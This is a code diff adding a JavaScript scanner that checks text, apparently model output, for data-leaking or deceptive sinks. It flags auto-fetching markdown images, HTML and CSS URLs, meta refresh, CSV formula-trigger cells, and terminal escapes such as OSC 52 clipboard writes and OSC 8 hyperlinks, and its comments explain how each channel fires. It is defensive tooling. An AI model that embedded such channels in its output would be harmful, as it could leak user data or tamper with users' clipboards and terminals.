+  ["table|background", { auto: true, what: "legacy table background" }],
+  ["td|background", { auto: true, what: "legacy cell background" }],
+  ["th|background", { auto: true, what: "legacy cell background" }],
+  ["tr|background", { auto: true, what: "legacy row background" }],
+  ["tbody|background", { auto: true, what: "legacy row group background" }],
+  ["body|background", { auto: true, what: "legacy body background" }],
+  ["x-sink-link|href", { auto: true, what: "link element", linkRel: true }],
+  ["a|href", { auto: false, what: "hyperlink" }],
+  ["area|href", { auto: false, what: "image map hyperlink" }],
+  ["form|action", { auto: false, what: "form target" }],
+  ["button|formaction", { auto: false, what: "form override target" }]
+]);
+
+var MD_STYLE_NAMES = mapFrom([
+  ["inline", "inline"], ["full-reference", "full reference"],
+  ["collapsed", "collapsed reference"], ["shortcut", "shortcut reference"]
+]);
+
+/* Only rel values that were actually measured to fetch are in here, because the
+   finding text says "Measured". apple-touch-icon was measured and did NOT
+   fetch, so it is deliberately absent; manifest was measured and did, so it is
+   present. */
+var AUTO_LINK_RELS = mapFrom([
+  ["preload", 1], ["stylesheet", 1], ["icon", 1], ["shortcut icon", 1],
+  ["prefetch", 1], ["prerender", 1], ["modulepreload", 1], ["manifest", 1]
+]);
+/* rel=preload only fetched when it declared what it was preloading. */
+var MEASURED_PRELOAD_AS = mapFrom([["image", 1], ["script", 1], ["style", 1], ["font", 1]]);
+
+/**
+ * extractCssUrls. @import is scanned first and its span recorded, so the url()
+ * inside it is not reported a second time. allowAtRules is false for a style
+ * attribute, where an at-rule is not valid and was measured not to fetch.
+ */
+function extractCssUrls(cssText, allowAtRules) {
+  var out = [];
+  var s = String(cssText == null ? "" : cssText);
+  var spans = [];
+  var m;
+  var guard = 0;
+
+  var maxMatches = s.length + 16;
+  var im = /@import\s+(?:url\(\s*)?("([^"\n]{0,2000})"|'([^'\n]{0,2000})'|([^;)\s]{0,2000}))\s*\)?/gi;
+  while ((m = im.exec(s)) !== null && guard < maxMatches) {
+    guard++;
+    if (m[0].length === 0) { im.lastIndex++; continue; }
+    spans.push({ start: m.index, end: m.index + m[0].length });
+    var iv = (m[2] !== undefined) ? m[2] : (m[3] !== undefined ? m[3] : (m[4] || ""));
+    if (iv && allowAtRules !== false) { out.push({ url: iv, kind: "css @import" }); }
+  }
+
+  var re = /url\(\s*("([^"\n]{0,2000})"|'([^'\n]{0,2000})'|([^)'"\s]{0,2000}))\s*\)/gi;
+  guard = 0;
+  var spanCursor = 0;
+  while ((m = re.exec(s)) !== null && guard < maxMatches) {
+    guard++;
+    if (m[0].length === 0) { re.lastIndex++; continue; }
+    /* spans and matches both arrive in increasing order, so one moving cursor
+       replaces a rescan of every span for every match. */
+    while (spanCursor < spans.length && spans[spanCursor].end <= m.index) { spanCursor++; }
+    if (spanCursor < spans.length && m.index >= spans[spanCursor].start) { continue; }
+    var v = (m[2] !== undefined) ? m[2] : (m[3] !== undefined ? m[3] : (m[4] || ""));
+    if (v) { out.push({ url: v, kind: "css url()" }); }
+  }
+  return out;
+}
+
+function severityFor(auto, cls) {
+  if (!cls.network) { return auto ? "low" : "info"; }
+  if (auto) {
+    if (cls.verdict === "forwarder") { return "critical"; }
+    if (cls.placeholder) { return "critical"; }
+    return cls.verdict === "allowlisted" ? "medium" : "high";
+  }
+  if (cls.verdict === "forwarder") { return "high"; }
+  return cls.verdict === "allowlisted" ? "low" : "medium";
+}
+
+function analyzeRenderSink(text, options) {
+  var opts = options || {};
+  var allowlist = opts.allowlist || [];
+  var source = String(text == null ? "" : text);
+  var maskResult = maskCodeRegions(source);
+  var masked = maskResult.masked;
+  var neu = neutralizeMarkup(masked);
+  var tok = tokenizeMarkup(neu.safe);
+  var findings = [];
+  var lineOfMasked = makeLineIndex(masked);
+  var lineOfSource = makeLineIndex(source);
+  var toSource = makeSourceMapper(neu.insertions);
+
+  function push(f) { findings.push(f); }
+
+  /* markdown structure, resolved document-wide */
+  var md = extractMarkdownTargets(masked);
+  for (var i = 0; i < md.targets.length; i++) {
+    var t = md.targets[i];
+    if (!t.dest) { continue; }
+    var cls = classifyDestination(t.dest, allowlist);
+    var auto = (t.kind === "image");
+    var sname = mapGet(MD_STYLE_NAMES, t.style, t.style);
+    var reasons = [];
+    if (auto) {
+      reasons.push("CommonMark renders a markdown image as an img element, so the browser issues this GET the instant the message appears. No click, no hover, no user action.");
+    } else {
+      reasons.push("A markdown link needs a click, so this is a lure rather than an automatic leak. It is listed because link text can say anything.");
+    }
+    if (t.style !== "inline") {
+      var away = (t.defLine === null) ? null : Math.abs(t.useLine - t.defLine);
+      reasons.push(
+        "This is a " + sname + ", written as a label here and defined on line " +
+        (t.defLine === null ? "?" : t.defLine) +
+        (away === null ? "" : (", " + away + " line" + (away === 1 ? "" : "s") + " away")) +
+        ". A filter that inspects one line at a time never sees the destination and passes it through."
+      );
+    }
+    reasons = reasons.concat(cls.reasons);
+    push({
+      sink: "render", severity: severityFor(auto, cls), auto: auto,
+      title: (auto ? "Auto-fetching markdown image" : "Markdown link") + " (" + sname + ")",
+      element: auto ? "img" : "a", attribute: auto ? "src" : "href",
+      url: t.dest, line: t.useLine, defLine: t.defLine, label: t.label,
+      cls: cls, reasons: reasons
+    });
+  }
+
+  /* raw HTML structure, from the neutralized string only */
+  for (var e = 0; e < tok.elements.length; e++) {
+    var el = tok.elements[e];
+    var srcIdx = toSource(el.index);
+    var line = lineOfMasked(srcIdx);
+
+    /* style element contents */
+    if (el.tag === "x-sink-style" && el.rawText) {
+      var cssUrls = extractCssUrls(el.rawText, true);
+      for (var c = 0; c < cssUrls.length; c++) {
+        var ccls = classifyDestination(cssUrls[c].url, allowlist);
+        push({
+          sink: "render", severity: severityFor(true, ccls), auto: true,
+          title: "Style element " + cssUrls[c].kind,
+          element: "style", attribute: cssUrls[c].kind, url: cssUrls[c].url,
+          line: line, defLine: null, label: "",
+          cls: ccls,
+          reasons: ["Measured: a url() in a style element and an @import in a style element both fired a request. Escaping HTML entities does not help here; the payload is CSS, not markup."].concat(ccls.reasons)
+        });
+      }
+      continue;
+    }
+
+    for (var a = 0; a < el.order.length; a++) {
+      var aname = el.order[a];
+      if (aname.slice(0, ATTR_PREFIX.length) !== ATTR_PREFIX) { continue; }
+      var real = aname.slice(ATTR_PREFIX.length);
+      var value = mapGet(el.attrs, aname, "");
+      if (value === "") { continue; }
+
+      if (real === "style") {
+        var sUrls = extractCssUrls(value, false);
+        for (var s2 = 0; s2 < sUrls.length; s2++) {
+          var scls = classifyDestination(sUrls[s2].url, allowlist);
+          push({
+            sink: "render", severity: severityFor(true, scls), auto: true,
+            title: "Style attribute url() on <" + el.tag + ">",
+            element: el.tag, attribute: "style url()", url: sUrls[s2].url,
+            line: line, defLine: null, label: "",
+            cls: scls,
+            reasons: ["Measured: a url() in a style attribute fired, including when the attribute was separated by a slash rather than a space."].concat(scls.reasons)
+          });
+        }
+        continue;
+      }
+
+      var key = el.tag + "|" + real;
+      if (!mapHas(FETCH_TABLE, key)) { continue; }
+      var spec = mapGet(FETCH_TABLE, key, null);
+      var auto2 = spec.auto;
+      var extra = [];
+
+      if (spec.requiresTypeImage) {
+        var ty = String(mapGet(el.attrs, "type", "")).toLowerCase();
+        if (ty !== "image") { continue; }
+      }
+      if (spec.linkRel) {
+        var rel = String(mapGet(el.attrs, "rel", "")).toLowerCase().replace(/\s+/g, " ").trim();
+        var asAttr = String(mapGet(el.attrs, "as", "")).toLowerCase().trim();
+        if (!mapHas(AUTO_LINK_RELS, rel)) {
+          auto2 = false;
+          extra.push("rel=\"" + rel + "\" was not measured to fetch on its own, so this is reported without an auto-fetch claim.");
+        } else if (rel === "preload" && asAttr === "") {
+          auto2 = false;
+          extra.push("Measured: rel=preload with no as attribute did not fetch. It fetched with as set to image, script, style or font. This one declares no as, so it is reported without an auto-fetch claim.");
+        } else if (rel === "preload" && !mapHas(MEASURED_PRELOAD_AS, asAttr)) {
+          extra.push("rel=preload was measured to fetch with as set to image, script, style and font. as=\"" + asAttr + "\" was not one of the four tested, so the auto-fetch call here is by extension rather than by measurement.");
+        } else {
+          extra.push("Measured: link rel=" + rel + (rel === "preload" ? " as=" + asAttr : "") + " fired a request.");
+        }
+      }
+
+      var urls = [];
+      if (real === "srcset" || real === "imagesrcset") {
+        var cands = value.split(",");
+        for (var ci2 = 0; ci2 < cands.length && ci2 < 40; ci2++) {
+          var cand = cands[ci2].trim().split(/\s+/)[0];
+          if (cand) { urls.push(cand); }
+        }
+      } else if (real === "srcdoc") {
+        var inner = neutralizeMarkup(value);
+        var innerTok = tokenizeMarkup(inner.safe);
+        for (var q2 = 0; q2 < innerTok.elements.length; q2++) {
+          var iel = innerTok.elements[q2];
+          for (var q3 = 0; q3 < iel.order.length; q3++) {
+            var ian = iel.order[q3];
+            if (ian.slice(0, ATTR_PREFIX.length) !== ATTR_PREFIX) { continue; }
+            var ikey = iel.tag + "|" + ian.slice(ATTR_PREFIX.length);
+            if (mapHas(FETCH_TABLE, ikey)) {
+              var iv2 = mapGet(iel.attrs, ian, "");
+              if (iv2) { urls.push(iv2); }
+            }
+          }
+        }
+        extra.push("Measured: an img nested inside an iframe srcdoc value fired its own request.");
+      } else {
+        urls.push(value);
+      }
+
+      for (var u = 0; u < urls.length; u++) {
+        var ucls = classifyDestination(urls[u], allowlist);
+        var rs = [];
+        rs.push(auto2
+          ? ("Measured: " + spec.what + " (" + el.tag + " " + real + ") fired a request with no user action.")
+          : (spec.what + " (" + el.tag + " " + real + ") needs a click or a submit, so it is a lure rather than an automatic leak."));
+        rs = rs.concat(extra).concat(ucls.reasons);
+        push({
+          sink: "render", severity: severityFor(auto2, ucls), auto: auto2,
+          title: (auto2 ? "Auto-fetching " : "") + spec.what,
+          element: el.tag === "x-sink-link" ? "link" : el.tag,
+          attribute: real, url: urls[u], line: line, defLine: null, label: "",
+          cls: ucls, reasons: rs
+        });
+      }
+    }
+
+    /* meta refresh */
+    if (el.tag === "x-sink-meta") {
+      var he = String(mapGet(el.attrs, "http-equiv", "")).toLowerCase();
+      var content = String(mapGet(el.attrs, "content", ""));
+      if (he === "refresh" && /url\s*=/i.test(content)) {
+        var mu = /url\s*=\s*['"]?([^'";]+)/i.exec(content);
+        if (mu) {
+          var mcls = classifyDestination(mu[1].trim(), allowlist);
+          push({
+            sink: "render", severity: severityFor(true, mcls), auto: true,
+            title: "Meta refresh navigation",
+            element: "meta", attribute: "http-equiv=refresh", url: mu[1].trim(),
+            line: line, defLine: null, label: "", cls: mcls,
+            reasons: ["Measured: a meta refresh performed the navigation, and a navigation is a GET carrying whatever is in the URL."].concat(mcls.reasons)
+          });
+        }
+      }
+    }
+  }
+
+  /* things hidden in comments: reported, never silently dropped */
+  for (var r = 0; r < maskResult.regions.length; r++) {
+    var reg = maskResult.regions[r];
+    if (reg.kind !== "html-comment") { continue; }
+    if (!/(!\[|\ssrc\s*=|\shref\s*=|url\()/i.test(reg.text)) { continue; }
+    push({
+      sink: "render", severity: "info", auto: false,
+      title: "Sink-shaped content inside an HTML comment",
+      element: "comment", attribute: "", url: "",
+      line: lineOfSource(reg.start), defLine: null, label: "",
+      cls: { reasons: [], verdict: "comment", verdictLabel: "", network: false, payloadBytes: 0 },
+      reasons: ["A comment is passed through as raw HTML by CommonMark rather than parsed as markdown, so this is not counted as a live finding. It is surfaced because a pipeline that strips or rewrites comments before rendering would change that."],
+      snippet: reg.text.slice(0, 240)
+    });
+  }
+
+  var counts = countSeverities(findings);
+  return {
+    sink: "render",
+    findings: sortFindings(findings),
+    counts: counts,
+    stats: {
+      neutralizedRewrites: neu.rewrites,
+      elementsParsed: tok.count,
+      linkDefinitions: md.definitions.count,
+      maskedRegions: maskResult.regions.length,
+      codeRegionsSkipped: countRegions(maskResult.regions)
+    },
+    neutralized: neu.safe
+  };
+}
+
+function countRegions(regions) {
+  var m = makeMap();
+  for (var i = 0; i < regions.length; i++) {
+    var k = regions[i].kind;
+    mapSet(m, k, mapGet(m, k, 0) + 1);
+  }
+  return m;
+}
+
+/* ---------- CSV sink ------------------------------------------------------- */
+
+/* OWASP CSV Injection: a cell must not begin with any of these. The seven
+   ASCII characters are the list every write-up quotes; the OWASP page also
+   names the full-width variants of the four formula characters, which are
+   interpreted as formulas in some locales, so those are checked too. They are
+   built from code points rather than written out, because this file is ASCII. */
+var CSV_TRIGGERS = [
+  { ch: "=", name: "equals", code: "0x3D", group: "ascii" },
+  { ch: "+", name: "plus", code: "0x2B", group: "ascii" },
+  { ch: "-", name: "minus", code: "0x2D", group: "ascii" },
+  { ch: "@", name: "at", code: "0x40", group: "ascii" },
+  { ch: "\t", name: "tab", code: "0x09", group: "ascii" },
+  { ch: "\r", name: "carriage return", code: "0x0D", group: "ascii" },
+  { ch: "\n", name: "line feed", code: "0x0A", group: "ascii" },
+  { ch: String.fromCharCode(0xff1d), name: "full-width equals", code: "U+FF1D", group: "fullwidth" },
+  { ch: String.fromCharCode(0xff0b), name: "full-width plus", code: "U+FF0B", group: "fullwidth" },
+  { ch: String.fromCharCode(0xff0d), name: "full-width minus", code: "U+FF0D", group: "fullwidth" },
+  { ch: String.fromCharCode(0xff20), name: "full-width at", code: "U+FF20", group: "fullwidth" }
+];
+var CSV_ASCII_TRIGGERS = 7;
+var CSV_TRIGGER_MAP = (function () {
+  var m = makeMap();
+  for (var i = 0; i < CSV_TRIGGERS.length; i++) { mapSet(m, CSV_TRIGGERS[i].ch, CSV_TRIGGERS[i]); }
+  return m;
+})();
+
+function splitCsvLine(line) {
+  var fields = [];
+  var cur = "";
+  var inQ = false;
+  for (var i = 0; i < line.length; i++) {
+    var c = line.charAt(i);
+    if (inQ) {
+      if (c === "\"") {
+        if (line.charAt(i + 1) === "\"") { cur += "\""; i++; }
+        else { inQ = false; cur += c; }
+      } else { cur += c; }
+    } else if (c === "\"") {
+      inQ = true; cur += c;
+    } else if (c === ",") {
+      fields.push(cur); cur = "";
+    } else {
+      cur += c;
+    }
+  }
+  fields.push(cur);
+  return fields;
+}
+
+/**
+ * A cell of "-1" or "+1,234.50" satisfies the OWASP rule as written, but a
+ * spreadsheet evaluates it to that number and nothing else. Reporting every
+ * negative figure in a finance export at high severity is exactly how a tool
+ * teaches its user to ignore it, so those are reported at low severity with the
+ * reason stated. Anything with an operator, a reference or a function name in
+ * it is not a plain number and is not downgraded.
+ */
+function isPlainNumericCell(rest) {
+  var v = String(rest == null ? "" : rest).replace(/[ \t]+$/, "");
+  if (v === "") { return true; }
+  return /^[$\u00a3\u20ac\u00a5]?[0-9][0-9,._ ]*(?:[eE][+\-]?[0-9]{1,4})?[%]?$/.test(v);
+}
+
+function csvCellVerdict(cell) {
+  var raw = String(cell == null ? "" : cell);
+  if (raw === "") { return null; }
+  var first = raw.charAt(0);
+  var unquoted = raw;
+  var quoted = false;
+  if (first === "\"" && raw.length > 1) {
+    quoted = true;
+    unquoted = raw.slice(1);
+    first = unquoted.charAt(0);
+  }
+  function verdict(trig, at, leadingWhitespace) {
+    var rest = unquoted.slice(at + 1);
+    var numeric = (trig.name.indexOf("plus") >= 0 || trig.name.indexOf("minus") >= 0) &&
+      isPlainNumericCell(rest);
+    return { trigger: trig, quoted: quoted, leadingWhitespace: leadingWhitespace, numeric: numeric };
+  }
+  if (mapHas(CSV_TRIGGER_MAP, first)) {
+    return verdict(mapGet(CSV_TRIGGER_MAP, first, null), 0, false);
+  }
+  var trimmedIdx = 0;
+  while (trimmedIdx < unquoted.length && " \t".indexOf(unquoted.charAt(trimmedIdx)) >= 0) { trimmedIdx++; }
+  if (trimmedIdx > 0) {
+    var fc = unquoted.charAt(trimmedIdx);
+    if (mapHas(CSV_TRIGGER_MAP, fc)) {
+      return verdict(mapGet(CSV_TRIGGER_MAP, fc, null), trimmedIdx, true);
+    }
+  }
+  return null;
+}
+
+function analyzeCsvSink(text, options) {
+  var opts = options || {};
+  var source = String(text == null ? "" : text);
+  var findings = [];
+  var lines = source.split(/\r\n|\n|\r/);
+
+  /* case 1: the whole response written into one cell */
+  var whole = csvCellVerdict(source);
+  if (whole) {
+    findings.push(makeCsvFinding(whole, source, 0, 0, "whole response as a single cell"));
+  }
+
+  /* case 2 and 3: per line, and per comma-delimited field within a line */
+  for (var li = 0; li < lines.length; li++) {
+    var line = lines[li];
+    if (line === "") { continue; }
+    var lineVerdict = csvCellVerdict(line);
+    if (lineVerdict) {
+      findings.push(makeCsvFinding(lineVerdict, line, li + 1, 0, "line written as a cell"));
+    }
+    if (line.indexOf(",") >= 0) {
+      var fields = splitCsvLine(line);
+      for (var fi = 0; fi < fields.length; fi++) {
+        if (fi === 0 && lineVerdict) { continue; }
+        var fv = csvCellVerdict(fields[fi]);
+        if (fv) {
+          findings.push(makeCsvFinding(fv, fields[fi], li + 1, fi + 1, "comma-delimited field"));
+        }
+      }
+    }
+  }
+
+  return {
+    sink: "csv",
+    findings: sortFindings(findings),
+    counts: countSeverities(findings),
+    stats: {
+      lines: lines.length,
+      triggersChecked: CSV_TRIGGERS.length,
+      asciiTriggersChecked: CSV_ASCII_TRIGGERS
+    }
+  };
+}
+
+function makeCsvFinding(v, cellText, row, col, mode) {
+  var t = v.trigger;
+  var shown = String(cellText).slice(0, 200);
+  var reasons = [];
+  reasons.push("OWASP's CSV Injection remediation is that no cell may begin with equals, plus, minus, at, tab (0x09), carriage return (0x0D) or line feed (0x0A), nor with the full-width variants of the four formula characters. This cell begins with " + t.name + " (" + t.code + ").");
+  if (t.group === "fullwidth") {
+    reasons.push("OWASP lists the full-width forms separately because some locales, Japanese environments among them, treat them as formula-initiating characters.");
+  }
+  if (v.quoted) {
+    reasons.push("The cell is quoted, which is a CSV quoting concern and not a formula concern. The first character inside the quotes is still " + t.name + ".");
+  }
+  if (v.leadingWhitespace) {
+    reasons.push("Strictly, the first character here is whitespace, so the rule as written does not fire. It is reported because whether the whitespace survives depends on the writer you hand this to.");
+  }
+  if (v.numeric) {
+    reasons.push("After the sign this cell is a plain number, which a spreadsheet evaluates to that number and nothing else. The OWASP rule still names the character, so this is reported, but at low severity: a finance export is full of these and treating them as attacks is how a scanner gets ignored.");
+  }
+  reasons.push("Checked as: " + mode + ".");
+  return {
+    sink: "csv",
+    severity: v.numeric ? "low" : (v.leadingWhitespace ? "medium" : "high"),
+    title: "Cell begins with " + t.name + " (" + t.code + ")",
+    element: "cell", attribute: mode, url: "",
+    line: row, col: col, snippet: shown,
+    cls: { reasons: [], verdict: "csv", verdictLabel: "", network: false, payloadBytes: 0 },
+    reasons: reasons
+  };
+}
+
+/* ---------- terminal sink -------------------------------------------------- */
+
+var ESC = "\u001b";
+var BEL = "\u0007";
+
+var SIMPLE_ESCAPES = mapFrom([
+  ["e", "\u001b"], ["a", "\u0007"], ["b", "\b"], ["f", "\f"],
+  ["n", "\n"], ["r", "\r"], ["t", "\t"], ["v", "\u000b"]
+]);
+
+/** Turn the escaped forms that survive a JSON log back into control bytes. */
+function decodeControlEscapes(text) {
+  var s = String(text == null ? "" : text);
+  var out = "";
+  var i = 0;
+  while (i < s.length) {
+    var c = s.charAt(i);
+    if (c !== "\\") { out += c; i++; continue; }
+    var n1 = s.charAt(i + 1);
+    if (n1 === "x" || n1 === "u") {
+      var hexLen = (n1 === "x") ? 2 : 4;
+      var hex = s.substr(i + 2, hexLen);
+      if (new RegExp("^[0-9a-fA-F]{" + hexLen + "}$").test(hex)) {
+        var cp = parseInt(hex, 16);
+        if (Number.isFinite(cp) && cp > 0 && cp <= 0x10ffff) {
+          out += String.fromCharCode(cp);
+          i += 2 + hexLen;
+          continue;
+        }
+      }
+    }
+    if (n1 >= "0" && n1 <= "7") {
+      var oct = /^[0-7]{1,3}/.exec(s.slice(i + 1));
+      if (oct) {
+        var ov = parseInt(oct[0], 8);
+        if (Number.isFinite(ov) && ov > 0 && ov < 256) {
+          out += String.fromCharCode(ov);
+          i += 1 + oct[0].length;
+          continue;
+        }
+      }
+    }
+    var simple = mapGet(SIMPLE_ESCAPES, n1, null);
+    if (simple !== null) { out += simple; i += 2; continue; }
+    if (n1 === "\\") { out += "\\"; i += 2; continue; }
+    out += c; i++;
+  }
+  return out;
+}
+
+function decodeBase64Ascii(b64) {
+  /* split so the file holds no single long base64-shaped literal */
+  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz" + "0123456789" + "+/";
+  var lookup = makeMap();
+  for (var i = 0; i < chars.length; i++) { mapSet(lookup, chars.charAt(i), i); }
+  var s = String(b64 == null ? "" : b64).replace(/[^A-Za-z0-9+/=]/g, "");
+  var out = "";
+  var buf = 0, bits = 0;
+  for (var j = 0; j < s.length; j++) {
+    var ch = s.charAt(j);
+    if (ch === "=") { break; }
+    if (!mapHas(lookup, ch)) { continue; }
+    buf = (buf << 6) | mapGet(lookup, ch, 0);
+    bits += 6;
+    if (bits >= 8) {
+      bits -= 8;
+      var byte = (buf >> bits) & 0xff;
+      out += (byte >= 0x20 && byte <= 0x7e) ? String.fromCharCode(byte) : ".";
+    }
+  }
+  return out;
+}
+
+/**
+ * Approximate what a terminal would actually show. Covers printable text,
+ * CR, BS, LF, cursor up/down/left/right/next/previous line, column address,
+ * absolute position, erase in line and erase in display. Everything else is
+ * dropped, which is why this is labelled approximate in the UI.
+ */
+function renderTerminalApprox(text) {
+  var s = String(text == null ? "" : text);
+  var MAXR = 5000, MAXC = 1000, MAXI = s.length + 16;
+  var grid = [[]];
+  var row = 0, col = 0;
+  var capped = false;
+  function cell(r) {
+    while (grid.length <= r) { grid.push([]); }
+    return grid[r];
+  }
+  function put(ch) {
+    var line = cell(row);
+    while (line.length < col) { line.push(" "); }
+    line[col] = ch;
+    col++;
+    if (col > MAXC) { col = MAXC; capped = true; }
+  }
+  function num(param, dflt) {
+    var v = parseInt(param, 10);
+    if (!Number.isFinite(v)) { return dflt; }
+    if (v < 0) { return 0; }
+    return Math.min(v, 1000);
+  }
+  /* An OSC sequence with no terminator makes a naive indexOf rescan the rest of
+     the string on every one of them, which is quadratic. i only ever moves
+     forward, so a cached hit stays valid until i passes it, and a miss is final. */
+  var ST = ESC + "\\";
+  var stCache = -2, belCache = -2;
+  function nextIndex(needle, from, cache) {
+    if (cache === -1) { return -1; }
+    if (cache >= from) { return cache; }
+    return s.indexOf(needle, from);
+  }
+  var i = 0, guard = 0;
+  while (i < s.length && guard < MAXI) {
+    guard++;
+    var c = s.charAt(i);
+    if (c === ESC) {
+      var n1 = s.charAt(i + 1);
+      if (n1 === "[") {
+        var m = /^\u001b\[([0-9;?]{0,32})([\x40-\x7e])/.exec(s.slice(i));
+        if (m) {
+          var params = m[1].replace(/\?/g, "").split(";");
+          var f = m[2];
+          var p0 = num(params[0], f === "J" || f === "K" ? 0 : 1);
+          if (f === "A") { row = Math.max(0, row - Math.max(1, p0)); }
+          else if (f === "B") { row = Math.min(MAXR, row + Math.max(1, p0)); }
+          else if (f === "C") { col = Math.min(MAXC, col + Math.max(1, p0)); }
+          else if (f === "D") { col = Math.max(0, col - Math.max(1, p0)); }
+          else if (f === "E") { row = Math.min(MAXR, row + Math.max(1, p0)); col = 0; }
+          else if (f === "F") { row = Math.max(0, row - Math.max(1, p0)); col = 0; }
+          else if (f === "G") { col = Math.max(0, Math.min(MAXC, p0 - 1)); }
+          else if (f === "H" || f === "f") {
+            row = Math.max(0, Math.min(MAXR, num(params[0], 1) - 1));
+            col = Math.max(0, Math.min(MAXC, num(params[1], 1) - 1));
+          } else if (f === "K") {
+            var line2 = cell(row);
+            if (p0 === 0) { line2.length = Math.min(line2.length, col); }
+            else if (p0 === 1) { for (var q = 0; q < Math.min(col + 1, line2.length); q++) { line2[q] = " "; } }
+            else { line2.length = 0; }
+          } else if (f === "J") {
+            if (p0 === 0) { grid.length = Math.min(grid.length, row + 1); cell(row).length = Math.min(cell(row).length, col); }
+            else if (p0 === 1) { for (var r2 = 0; r2 < row; r2++) { grid[r2] = []; } cell(row).length = 0; }
+            else { grid = [[]]; row = 0; col = 0; }
+          }
+          i += m[0].length;
+          continue;
+        }
+      } else if (n1 === "]") {
+        var stIdx = nextIndex(ST, i, stCache); stCache = stIdx;
+        var belIdx = nextIndex(BEL, i, belCache); belCache = belIdx;
+        var endIdx = -1;
+        if (stIdx >= 0 && (belIdx < 0 || stIdx < belIdx)) { endIdx = stIdx + 2; }
+        else if (belIdx >= 0) { endIdx = belIdx + 1; }
+        if (endIdx > 0) { i = endIdx; continue; }
+      }
+      i++;
+      continue;
+    }
+    if (c === "\r") { col = 0; i++; continue; }
+    if (c === "\n") { if (row + 1 > MAXR) { capped = true; } row = Math.min(MAXR, row + 1); col = 0; i++; continue; }
+    if (c === "\b") { col = Math.max(0, col - 1); i++; continue; }
+    if (c === "\t") { col = Math.min(MAXC, col + (8 - (col % 8))); i++; continue; }
+    if (c === BEL || c.charCodeAt(0) < 0x20) { i++; continue; }
+    put(c);
+    i++;
+  }
+  if (i < s.length) { capped = true; }
+  var lines = [];
+  for (var g = 0; g < grid.length && g < MAXR; g++) {
+    lines.push(trimTrailing(grid[g].join("")));
+  }
+  if (grid.length > MAXR) { capped = true; }
+  while (lines.length > 1 && lines[lines.length - 1] === "") { lines.pop(); }
+  return { text: lines.join("\n"), capped: capped, maxRows: MAXR, maxCols: MAXC };
+}
+
+/**
+ * expandTabs: the reconstruction advances the cursor to the next eight-column
+ * stop on a tab, so the raw text has to be expanded the same way before the two
+ * are compared. Comparing an expanded string against an unexpanded one makes
+ * any tab look like the output rewrote itself, which is a false positive that
+ * would inflate the severity of a finding.
+ */
+function expandTabs(text) {
+  var lines = String(text == null ? "" : text).split("\n");
+  for (var i = 0; i < lines.length; i++) {
+    if (lines[i].indexOf("\t") < 0) { continue; }
+    var out = "", col = 0;
+    for (var j = 0; j < lines[i].length; j++) {
+      var c = lines[i].charAt(j);
+      if (c === "\t") { var n = 8 - (col % 8); out += new Array(n + 1).join(" "); col += n; }
+      else { out += c; col++; }
+    }
+    lines[i] = out;
+  }
+  return lines.join("\n");
+}
+
+function stripAllEscapes(text) {
+  var s = String(text == null ? "" : text);
+  s = s.replace(/\u001b\][^\u0007\u001b]{0,4000}(?:\u0007|\u001b\\)/g, "");
+  s = s.replace(/\u001b\[[0-9;?]{0,32}[\x40-\x7e]/g, "");
+  s = s.replace(/\u001b./g, "");
+  return s;
+}
+
+function analyzeTerminalSink(text, options) {
+  var opts = options || {};
+  var s = String(text == null ? "" : text);
+  if (opts.decodeEscapes !== false) { s = decodeControlEscapes(s); }
+  var findings = [];
+  var counts = { osc: 0, csi: 0, cr: 0, bs: 0, sgr: 0 };
+  var lineOf = makeLineIndex(s);
+  /* Every match consumes at least one character, so the length of the input is
+     itself the loop bound. A fixed cap would undercount, and the finding text
+     below states these counts as exact numbers. */
+  var maxMatches = s.length + 16;
+
+  /* OSC sequences */
+  var oscRe = /\u001b\]([0-9]{1,4});([^\u0007\u001b]{0,4000})(?:\u0007|\u001b\\)/g;
+  var m;
+  var guard = 0;
+  var openLink = null;
+  while ((m = oscRe.exec(s)) !== null && guard < maxMatches) {
+    guard++;
+    counts.osc++;
+    var ps = m[1];
+    var pt = m[2];
+    var line = lineOf(m.index);
+    if (ps === "8") {
+      var semi = pt.indexOf(";");
+      var uri = (semi < 0) ? "" : pt.slice(semi + 1);
+      if (uri === "") {
+        if (openLink) {
+          var visible = stripAllEscapes(s.slice(openLink.textStart, m.index));
+          openLink.finding.snippet = visible;
+          openLink.finding.reasons.push("What the reader sees is: " + JSON.stringify(visible) + ". What the terminal opens is the URI above. Those are independent strings.");
+          openLink = null;
+        }
+        continue;
+      }
+      var cls8 = classifyDestination(uri, opts.allowlist || []);
+      var f8 = {
+        sink: "terminal",
+        severity: cls8.network ? (cls8.verdict === "forwarder" ? "high" : "medium") : "low",
+        title: "OSC 8 hyperlink in terminal output",
+        element: "OSC 8", attribute: "URI", url: uri, line: line, snippet: "",
+        cls: cls8,
+        reasons: ["An OSC 8 hyperlink is written as OSC 8 ; params ; url ST and closed with OSC 8 ; ; ST, where OSC is ESC ] and ST is ESC backslash. The label between the two sequences is arbitrary text: the terminal shows the label and opens the url."].concat(cls8.reasons)
+      };
+      findings.push(f8);
+      openLink = { finding: f8, textStart: m.index + m[0].length };
+    } else if (ps === "52") {
+      var parts = pt.split(";");
+      var payload = parts.length > 1 ? parts.slice(1).join(";") : "";
+      var preview = decodeBase64Ascii(payload);
+      findings.push({
+        sink: "terminal", severity: "high",
+        title: "OSC 52 writes to your clipboard",
+        element: "OSC 52", attribute: "selection data", url: "", line: line,
+        snippet: preview.slice(0, 200),
+        cls: { reasons: [], verdict: "terminal", verdictLabel: "", network: false, payloadBytes: payload.length },
+        reasons: [
+          "XTerm documents OSC 52 as Manipulate Selection Data: the second parameter is normally base64, and the data becomes the new selection, available for pasting by other applications.",
+          "Encoded payload is " + payload.length + " characters. Printable decode preview is shown below.",
+          "Model output that reaches a terminal can therefore change what your next paste inserts. XTerm notes these controls may be disabled with the allowWindowOps resource."
+        ]
+      });
+    } else if (ps === "0" || ps === "1" || ps === "2") {
+      findings.push({
+        sink: "terminal", severity: "low",
+        title: "OSC " + ps + " changes the terminal title",
+        element: "OSC " + ps, attribute: "title", url: "", line: line,
+        snippet: pt.slice(0, 160),
+        cls: { reasons: [], verdict: "terminal", verdictLabel: "", network: false, payloadBytes: pt.length },
+        reasons: ["XTerm documents OSC 0 as Change Icon Name and Window Title, and OSC 2 as Change Window Title. Output can therefore relabel the window a human is using to decide what they are looking at."]
+      });
+    }
+  }
+
+  /* CSI sequences */
+  var csiRe = /\u001b\[([0-9;?]{0,32})([\x40-\x7e])/g;
+  var moves = [];
+  var erases = [];
+  guard = 0;
+  while ((m = csiRe.exec(s)) !== null && guard < maxMatches) {
+    guard++;
+    counts.csi++;
+    var fin = m[2];
+    if (fin === "m") { counts.sgr++; continue; }
